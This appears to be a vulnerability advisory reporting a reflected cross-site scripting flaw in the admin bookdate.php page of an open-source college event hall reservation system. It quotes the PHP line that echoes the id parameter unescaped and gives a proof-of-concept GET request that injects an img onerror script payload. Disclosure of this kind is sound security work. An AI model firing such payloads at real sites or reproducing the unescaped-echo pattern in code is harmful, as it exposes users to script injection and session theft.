# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS bookdate.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/bookdate.php

## Code
```php
<h1 class="logo "><a href="../home.php?id=<?php echo $id; ?>">Emisha</a></h1>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/bookdate.php?id="><img+src%3dx+onerror%3dalert("NoChizPlz")>&room_id=1 HTTP/1.1
Host: [REDACTED]
```

## Screenshot


